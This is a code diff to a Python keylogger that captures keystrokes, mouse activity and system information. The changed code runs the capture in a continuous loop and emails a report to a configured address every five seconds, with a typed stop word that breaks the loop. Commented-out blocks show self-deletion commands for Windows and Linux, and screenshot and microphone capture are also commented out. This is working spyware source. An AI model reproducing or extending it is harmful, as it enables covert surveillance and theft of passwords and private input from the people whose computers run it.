@@ -9,7 +9,11 @@ import pyscreenshot
 import sounddevice as sd
 from pynput import keyboard, mouse
 from dotenv import load_dotenv
-from utils import send_mail_with_attachment, get_wav_and_png_files, delete_wav_and_png_files
+from utils import (
+    send_mail_with_attachment,
+    get_wav_and_png_files,
+    delete_wav_and_png_files,
+)
 
 load_dotenv()
 
@@ -21,6 +25,7 @@ EMAIL_SENDER = os.getenv("EMAIL_SENDER")
 EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")
 EMAIL_CC = os.getenv("EMAIL_CC")
 SEND_REPORT_EVERY = 5  # seconds
+MAGIC_WORD="STOP"
 
 
 class KeyLogger:
@@ -29,6 +34,7 @@ class KeyLogger:
         self.mouse_listener = None
         self.interval = time_interval
         self.log = "KeyLogger Started...\n"
+        self.magic_word = ""
 
     def appendlog(self, string):
         if string:
@@ -60,7 +66,8 @@ class KeyLogger:
                 current_key = "ESC"
             else:
                 current_key = " " + str(key) + " "
-
+        
+        self.magic_word = self.magic_word + current_key
         self.appendlog("\nPressed key: {0}".format(current_key))
 
     def send_mail(self, message):
@@ -88,6 +95,7 @@ class KeyLogger:
         self.log = ""
         self.keyboard_listener.stop()
         self.mouse_listener.stop()
+        self.magic_word = ""
         delete_wav_and_png_files()
 
     def system_information(self):
@@ -123,40 +131,45 @@ class KeyLogger:
         self.appendlog("\nscreenshot used.")
 
     def run(self):
-        self.keyboard_listener = keyboard.Listener(on_press=self.save_data)
-        self.keyboard_listener.start()
+        while(True):
+            self.keyboard_listener = keyboard.Listener(on_press=self.save_data)
+            self.keyboard_listener.start()
 
-        self.mouse_listener = mouse.Listener(
-            on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll
-        )
-        self.mouse_listener.start()
+            self.mouse_listener = mouse.Listener(
+                on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll
+            )
+            self.mouse_listener.start()
 
-        # if os.name == "nt":
-        #     try:
-        #         pwd = os.path.abspath(os.getcwd())
-        #         os.system("cd " + pwd)
-        #         os.system("TASKKILL /F /IM " + os.path.basename(__file__))
-        #         print("File was closed.")
-        #         os.system("DEL " + os.path.basename(__file__))
-        #     except OSError:
-        #         print("File is close.")
-        # else:
-        #     try:
-        #         pwd = os.path.abspath(os.getcwd())
-        #         os.system("cd " + pwd)
-        #         os.system("pkill leafpad")
-        #         os.system("chattr -i " + os.path.basename(__file__))
-        #         print("File was closed.")
-        #         os.system("rm -rf" + os.path.basename(__file__))
-        #     except OSError:
-        #         print("File is close.")
+            # if os.name == "nt":
+            #     try:
+            #         pwd = os.path.abspath(os.getcwd())
+            #         os.system("cd " + pwd)
+            #         os.system("TASKKILL /F /IM " + os.path.basename(__file__))
+            #         print("File was closed.")
+            #         os.system("DEL " + os.path.basename(__file__))
+            #     except OSError:
+            #         print("File is close.")
+            # else:
+            #     try:
+            #         pwd = os.path.abspath(os.getcwd())
+            #         os.system("cd " + pwd)
+            #         os.system("pkill leafpad")
+            #         os.system("chattr -i " + os.path.basename(__file__))
+            #         print("File was closed.")
+            #         os.system("rm -rf" + os.path.basename(__file__))
+            #     except OSError:
+            #         print("File is close.")
 
-        # self.system_information()
-        # self.screenshot()
-        # self.microphone()
-        time.sleep(SEND_REPORT_EVERY)
-        self.report()
-        self.cleanup()
+            self.system_information()
+            # self.screenshot()
+            # self.microphone()
+            time.sleep(SEND_REPORT_EVERY)
+            self.report()
+
+            if MAGIC_WORD in self.magic_word:
+                break
+
+            self.cleanup()
 
 
 keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
